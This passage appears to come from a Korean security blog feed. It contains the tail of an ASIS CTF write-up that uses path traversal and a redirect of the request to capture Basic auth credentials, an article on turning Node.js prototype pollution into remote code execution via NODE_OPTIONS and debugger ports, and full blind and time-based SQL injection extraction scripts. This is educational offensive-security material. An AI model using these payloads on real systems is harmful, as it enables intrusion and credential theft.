class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- http://66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../etc/apache2/sites-enabled/000-default.conf%23.doc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">srv</span>/&gt;</span></span><br><span class="line">       Options Indexes FollowSymLinks</span><br><span class="line">       Require all granted</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">    DocumentRoot /srv/app/public</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> "/<span class="attr">srv</span>/<span class="attr">app</span>/<span class="attr">public</span>"&gt;</span></span><br><span class="line">        AllowOverride all</span><br><span class="line">        Require all granted</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br></pre></td></tr></table></figure><p>아파치 설정 파일을 통해, 웹 루트를 확인할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http:<span class="comment">//66.172.33.59:5000/get_doc?url=http://66.172.33.59/doc_app/doc.php?filename=../../../srv/app/public/flag/flag.php%23.doc --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> $_ENV[<span class="string">'FLAG'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'This page only accepts POST method'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/flag/flag.php</code> 파일을 확인하면, POST 메소드로 호출할 시에<br>환경변수에 저장된 FLAG를 출력해 주도록 되어 있습니다.<br>그러나 현재는 GET 메소드로만 호출이 가능한 상황이므로 플래그를 얻는 것이 불가능합니다.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /srv/app/public/.htaccess --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mod_rewrite.c</span>&gt;</span></span><br><span class="line">    RewriteEngine On</span><br><span class="line">    RedirectMatch 301 (.*).doc$ http://66.172.33.59$1</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br><span class="line"></span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName "Restricted Content"</span><br><span class="line">AuthUserFile /etc/apache2/.htpasswd</span><br><span class="line">Require valid-user</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- /etc/apache2/.htpsswd --&gt;</span></span><br><span class="line">secr3tUser_sys:$apr1$aWUbyZd0$Ge9ygNPiGeccI5iz645.X0</span><br></pre></td></tr></table></figure><p>내부 서버에 직접 접속할 수 있다면, POST 메소드로 페이지를 요청하는 것도 간단할 것 같습니다.<br>하지만 실제로 접속해보면, 연결 자체가 블록되어 있지는 않지만, basic 인증을 요구하고 있습니다.<br><code>.htpasswd</code> 에서 해시값은 알 수 있지만, 평문 패스워드를 알아낼 수는 없습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d.doc --&gt;</span><br><span class="line">HTTPConnectionPool(host&#x3D;&#39;66.172.33.59%0d&#39;, port&#x3D;80): Max retries exceeded with url: &#x2F; (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f953e32ccd0&gt;: Failed to establish a new connection: [Errno -2] Name or service not known&#39;))</span><br></pre></td></tr></table></figure><p><code>CRLF Injection</code> 혹은 타 호스트로의 접속을 유도할 수 있다면 문제 해결이 가능할 것 같습니다.<br>따라서 <code>CRLF Injection</code> 이 가능 유무를 확인하던 도중 이상 현상을 확인했습니다.<br>TrustZone 에서 호스트를 파싱하는 로직에 문제가 있어 보입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d@.doc</span><br><span class="line">No host specified.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;66.172.33.59:5000&#x2F;get_doc?url&#x3D;http:&#x2F;&#x2F;66.172.33.59&#x2F;%0a%0d@rwx.kr.doc</span><br><span class="line">[Server Content]</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 대상 호스트를 변경 할 수 있었습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@rwx:/var/www/html<span class="comment"># nc -lvp 9999</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from ip-66-172-33-59.chunkhost.com 45572 received!</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: rwx.kr:9999</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI=</span><br></pre></td></tr></table></figure><p>그러면 요청에 포함된 헤더를 통해 크리덴셜을 확인할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST &#x2F;flag&#x2F;flag.php? HTTP&#x2F;1.1</span><br><span class="line">Host: 66.172.33.59</span><br><span class="line">Accept: text&#x2F;html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Authorization: Basic c2VjcjN0VXNlcl9zeXM6ZWQ2MGNiZDYwZTgzNzg4NTg5YTI1NGUxMzZiYjAzMGI&#x3D;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 18 Nov 2019 20:20:10 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">X-Powered-By: PHP&#x2F;7.3.11</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">ASIS&#123;ce4e0de7ace0353bc9370d36365c3a17&#125;</span><br></pre></td></tr></table></figure><p>이를 이용하면, Trust Zone 내부 서버에 직접 접속이 가능해지므로, 플래그를 얻을 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASIS CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prototype Pollution to RCE</title>
      <link href="/prototype-pollution-to-rce/"/>
      <url>/prototype-pollution-to-rce/</url>
      
        <content type="html"><![CDATA[<p><code>Prototype pollution</code> 은 객체 기반 스크립트 언어라는 자바스크립트 특이성으로 인해 발생합니다. 따라서 <code>Nodejs</code> 등 자바스크립트 엔진 기반 서버에서 존재하는 취약점입니다. 자바스크립트의 자료형은 <code>prototype</code> 속성을 포함하는데 특정 객체 / 클래스의 <code>prototype</code> 데이터의 변조가 가능하다면 이후 그 객체의 생성자를 통해 새로운 인스턴스를 생성 할 때에 참조하는 프로토타입 객체의 속성이 변경됩니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inst = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">inst.__proto__.isAdmin = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(isAdmin); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>위처럼 특정 객체 클래스의 인스턴스의 <code>__proto__</code> 속성을 추가해 주는 것으로 다음 생성될 인스턴스의 속성에까지 영향을 끼칠 수 있습니다. DOM 과 NodeJS 에서 사용하는 window, process, global, root 등의 전역 변수 또한 Object 를 상속하고 있으므로 Object.prototype을 변조시킬 경우, 전역 객체 내부의 정의되지 않은 값 또한 임의로 조작될 수 있습니다.</p><p>본 취약점은 <a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/" target="_blank" rel="noopener">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a> 에 상세하게 기술되어 있습니다.</p><p>Prototype Pollution은 임의의 변수를 선언하여, 높은 확률로 프로그램의 흐름을 조작할 수 있도록 합니다.<br>따라서 화이트 박스 테스팅에서는 수월하게 취약점을 확인할 수 있지만<br>블랙박스 테스팅에서는, 본 취약점의 존재를 확인했다고 하더라도 DOS 이상의 Impact를 내는 것이 어려울 수 있습니다.</p><p>본 게시글은 이러한 상황에서 서버 RCE 를 유발하는 몇가지 방법을 소개합니다.</p><blockquote><p>Code Execution</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.command = <span class="string">'console.log("executed!")'</span>;</span><br><span class="line"><span class="keyword">if</span> (command) &#123;</span><br><span class="line"><span class="built_in">eval</span>(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>본 취약점이 존재하는 상황에서 RCE를 유발할 수 있는 가장 좋은 상황은 위와 같습니다.<br>선언이나 검증 과정 없이, eval 함수에 특정 변수를 인자로 하여 전달할 수 있다면<br>아주 편안하게 RCE를 유발할 수 있습니다.</p><blockquote><p>Logical Vectors</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.polluted = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (polluted <span class="keyword">in</span> <span class="keyword">this</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Pollution</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.polluted = <span class="string">'something'</span></span><br><span class="line"><span class="comment">// Use</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> atrr <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.prototype.isAdmin = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (session.isAdmin) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (session.id === <span class="string">'admin'</span>) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">value, options</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (options.auth) &#123;</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125;</span><br><span class="line">inst_a = <span class="keyword">new</span> A();</span><br><span class="line">inst_a.__proto__.__proto__ = [<span class="string">'something'</span>];</span><br><span class="line">inst_a.toString() <span class="comment">// "something"</span></span><br></pre></td></tr></table></figure><blockquote><p>Process spawning</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/nodejs/node/blob/master/lib/child_process.js#L514</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    <span class="keyword">const</span> value = env[key];</span><br><span class="line">    <span class="keyword">if</span> (value !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      envPairs.push(<span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>NodeJS의 내장 모듈이며, 서브 프로세스를 생성하는 데에 사용되는<br>child_process 모듈은 자식 프로세스를 생성할 때, 환경 변수를 복사하는 과정을 거치는데<br>복사 과정에 위에서 언급된 <code>for in</code> 반복문을 사용하고 있으므로</p><p>process.env 객체 내부에 직접적으로 정의되지 않았더라도<br>process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면<br>자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE_OPTIONS=<span class="string">'--require /proc/self/environ'</span> node app.js</span><br><span class="line">// same as</span><br><span class="line">node --require /proc/self/environ app.js</span><br></pre></td></tr></table></figure><p>또한 NodeJS 프로세스가 실행될 때, 스크립트가 실행되기 이전에 쓰이는 환경 변수중의 하나로 <code>NODE_OPTIONS</code> 환경변수가 존재하는데<br>본 변수에 <code>--require [argv]</code> 와 같은 NodeJS 프로세스 실행에 사용되는 옵션을 추가하면<br>스크립트 실행에 <code>--require [argv]</code> 추가하여 실행한 것과 같은 효과를 줍니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// pollute</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.env = &#123;</span><br><span class="line">NODE_DEBUG : <span class="string">'require("child_process").execSync("mkdir executed")//'</span>,</span><br><span class="line">NODE_OPTIONS : <span class="string">'-r /proc/self/environ'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 1</span></span><br><span class="line">fork(<span class="string">'blank'</span>);</span><br><span class="line"><span class="comment">// method 2</span></span><br><span class="line">spawn(<span class="string">'node'</span>, [<span class="string">'blank'</span>]).stdout.pipe(process.stdout);</span><br><span class="line"><span class="comment">// method 3</span></span><br><span class="line"><span class="built_in">console</span>.log(spawnSync(<span class="string">'node'</span>, [<span class="string">'blank'</span>]).stdout.toString());</span><br><span class="line"><span class="comment">// method 4</span></span><br><span class="line"><span class="built_in">console</span>.log(execSync(<span class="string">'node  blank'</span>).toString());</span><br></pre></td></tr></table></figure><p>위 두가지를 복합적으로 사용하여 RCE를 유발하는 방법입니다.<br>환경 변수에 스크립트를 포함시키고, 환경 변수가 저장되는 <code>/proc/self/environ</code> 파일을 옵션으로 지정하여, 임의 명령을 실행할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec, execSync, spawn, spawnSync, fork &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// pollute</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.env = &#123;</span><br><span class="line">    NODE_OPTIONS : <span class="string">'--inspect-brk=0.0.0.0:1234'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// method 1</span></span><br><span class="line">fork(<span class="string">'blank'</span>);</span><br><span class="line"><span class="comment">// method 2</span></span><br><span class="line">exec(<span class="string">'node blank'</span>);</span><br><span class="line"><span class="comment">// method 3</span></span><br><span class="line">execSync(<span class="string">'node blank'</span>);</span><br><span class="line"><span class="comment">// method 4</span></span><br><span class="line">spawn(<span class="string">'node'</span>, [<span class="string">'blank'</span>]);</span><br><span class="line"><span class="comment">// method 5</span></span><br><span class="line">spawnSync(<span class="string">'node'</span>, [<span class="string">'blank'</span>]);</span><br></pre></td></tr></table></figure><p><code>/proc/self/environ</code> 파일을 사용하는 이전의 방법은 리눅스 서버에서만 작동한다는 단점이 존재합니다.<br>하지만, <code>--inspect-brk</code> 옵션을 이용하면 윈도우에서도 사용이 가능하도록 할 수 있습니다.<br>본 옵션을 사용하여 서브 노드 프로세스를 생성하면, 해당 프로세스는 옵션에 설정된 포트로 디버거가 연결될 때가지 대기하며<br>사실상 백도어와 동일한 역할을 수행할 수 있습니다.</p><p>디버깅 포트가 열리면 <code>node inspect host:port</code> 와 같은 명령을 통해 서버에 연결할 수 있습니다.<br>이후 <code>exec</code> 서브 커맨드를 사용하면 <code>exec child_process.exec(&#39;mkdir executed&#39;)</code> 와 같은 명령을 이용해<br>서버에서 임의의 명령을 실행하게 만들 수 있습니다.</p><p><img src="/img/2019/10/image-3.png" alt="img"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/#/65" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/</a><br><a href="https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/" target="_blank" rel="noopener">https://blog.coderifleman.com/2019/07/19/prototype-pollution-attacks-in-nodejs/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> prototype pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql Injection with NodeJS</title>
      <link href="/sql-injection-with-nodejs/"/>
      <url>/sql-injection-with-nodejs/</url>
      
        <content type="html"><![CDATA[<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"><span class="keyword">const</span> dict = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz=&#123;/&#125;:.,_'</span>;</span><br><span class="line"></span><br><span class="line">option = <span class="function">(<span class="params">query</span>) =&gt;</span> (&#123;</span><br><span class="line"><span class="string">"headers"</span>: &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"rwx.kr"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=posix"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"qs"</span>: &#123; <span class="string">"pw"</span> : <span class="string">`' || id=0x61646d696e &amp;&amp; pw like 0x<span class="subst">$&#123;Buffer.<span class="keyword">from</span>(query).toString(<span class="string">'hex'</span>)&#125;</span>25 #`</span>&#125;,</span><br><span class="line"><span class="string">"method"</span>: <span class="string">"GET"</span>,</span><br><span class="line"><span class="string">"uri"</span>: <span class="string">"http://rwx.kr/page.php"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">data = <span class="string">''</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> chr <span class="keyword">of</span> dict) &#123;</span><br><span class="line">        request(option(data + chr), <span class="function"><span class="keyword">function</span>(<span class="params">err, res, body</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (body.indexOf(<span class="string">'Hello admin'</span>) !== <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(data + chr);</span><br><span class="line">                exploit(data + chr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br></pre></td></tr></table></figure><h2 id="Time-based-Blind"><a href="#Time-based-Blind" class="headerlink" title="Time based Blind"></a>Time based Blind</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request-promise'</span>);</span><br><span class="line"><span class="keyword">const</span> dict = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz:=&#123;&#125;./_'</span>;</span><br><span class="line"><span class="keyword">const</span> delay = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> option = <span class="function">(<span class="params">query</span>) =&gt;</span> (&#123;</span><br><span class="line"><span class="string">"headers"</span>: &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"rwx.kr"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"PHPSESSID=posix"</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="string">"body"</span>: <span class="string">`order=(select concat(title,0x3a,contents) from note where id=0x61646d696e)`</span> +</span><br><span class="line">            <span class="string">`like 0x<span class="subst">$&#123;Buffer.<span class="keyword">from</span>(query).toString(<span class="string">'hex'</span>)&#125;</span>25 and sleep(<span class="subst">$&#123;delay&#125;</span>)`</span>,</span><br><span class="line"><span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line"><span class="string">"uri"</span>: <span class="string">"http://rwx.kr/"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params">data = <span class="string">''</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> chr <span class="keyword">of</span> dict) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> query = data + chr</span><br><span class="line">        <span class="keyword">var</span> begin = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> request(option(query));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() - begin &gt; delay * <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(data + chr);</span><br><span class="line">            <span class="keyword">return</span> exploit(data + chr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exploit();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccon 2019 - SPA</title>
      <link href="/seccon-2019-spa/"/>
      <url>/seccon-2019-spa/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 